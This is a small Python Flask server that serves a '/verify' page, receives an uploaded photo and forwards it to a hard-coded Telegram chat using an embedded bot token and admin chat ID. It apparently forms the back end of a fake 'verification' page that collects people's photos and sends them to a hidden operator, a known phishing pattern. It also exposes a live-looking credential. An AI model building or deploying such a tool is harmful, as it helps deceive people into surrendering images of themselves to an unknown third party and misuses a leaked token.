from flask import Flask, request, send_from_directory
import requests, os

# ===== CONFIG =====
BOT_TOKEN = "8568845871:AAHO5Xi1iUuXeCOoaKdIbCz1jkFeu629pJo"
ADMIN_CHAT_ID = 6508791739  # @userinfobot se mila ID
UPLOAD_DIR = "uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)
app = Flask(__name__)

@app.route("/verify")
def verify():
    return send_from_directory(".", "index.html")

@app.route("/upload", methods=["POST"])
def upload():
    file = request.files.get("photo")
    if not file:
        return "No photo", 400

    path = os.path.join(UPLOAD_DIR, "verify.jpg")
    file.save(path)

    # Forward to Telegram
    tg = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    with open(path, "rb") as f:
        requests.post(tg, data={"chat_id": ADMIN_CHAT_ID}, files={"photo": f})

    return "OK"

app.run(host="0.0.0.0", port=8080)

